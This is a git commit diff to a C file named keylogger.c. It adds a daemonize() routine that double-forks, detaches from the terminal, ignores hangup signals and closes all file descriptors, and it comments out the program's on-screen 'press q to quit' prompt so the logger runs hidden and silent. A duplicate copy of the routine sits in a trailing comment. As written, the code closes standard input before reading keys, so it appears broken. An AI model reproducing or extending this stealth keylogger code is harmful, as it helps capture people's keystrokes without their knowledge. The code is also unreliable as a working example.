3fd436886500d7a46131968135fa51f011f29a84
yanistzl <yanistentzl@gmail.com>
2024-05-05 17:27:21 +0200

    maybe a daemonize working

--- keylogger.c
+++ keylogger.c
@@ -3,6 +3,9 @@
 #include <string.h>
 #include <termios.h>
 #include <unistd.h>
+#include <sys/types.h>
+#include <sys/stat.h>
+#include <signal.h>
 
 #define BUFFER_SIZE 256
 
@@ -28,12 +31,50 @@ char getch() {
     return ch;
 }
 
+void daemonize() {
+    pid_t pid;
+    pid = fork();
+    if (pid < 0) {
+        exit(EXIT_FAILURE);
+    }
+    if (pid > 0) {
+        exit(EXIT_SUCCESS); 
+    }
+
+    if (setsid() < 0) {
+        exit(EXIT_FAILURE);
+    }
+
+    signal(SIGCHLD, SIG_IGN);
+    signal(SIGHUP, SIG_IGN);
+
+    pid = fork();
+    if (pid < 0) {
+        exit(EXIT_FAILURE);
+    }
+    if (pid > 0) {
+        exit(EXIT_SUCCESS); 
+    }
+    
+    umask(0);
+
+    chdir("/");
+
+    
+    for (int x = sysconf(_SC_OPEN_MAX); x>=0; x--) {
+        close(x);
+    }
+} 
+
 int main() {
+    daemonize();
+
+
     char buffer[BUFFER_SIZE] = "";
     char key;
     int buffer_index = 0;
 
-    printf("Appuyer sur 'q' pour quitter.\n");
+ //   printf("Appuyer sur 'q' pour quitter.\n");
 
     while (1) {
         key = getch();
@@ -54,3 +95,37 @@ int main() {
     return 0;
 }
 
+/** void daemonize() {
+    pid_t pid;
+    pid = fork();
+    if (pid < 0) {
+        exit(EXIT_FAILURE);
+    }
+    if (pid > 0) {
+        exit(EXIT_SUCCESS); 
+    }
+
+    if (setsid() < 0) {
+        exit(EXIT_FAILURE);
+    }
+
+    signal(SIGCHLD, SIG_IGN);
+    signal(SIGHUP, SIG_IGN);
+
+    pid = fork();
+    if (pid < 0) {
+        exit(EXIT_FAILURE);
+    }
+    if (pid > 0) {
+        exit(EXIT_SUCCESS); 
+    }
+    
+    umask(0);
+
+    chdir("/");
+
+    // Close 
+    for (int x = sysconf(_SC_OPEN_MAX); x>=0; x--) {
+        close(x);
+    }
+} **/ 
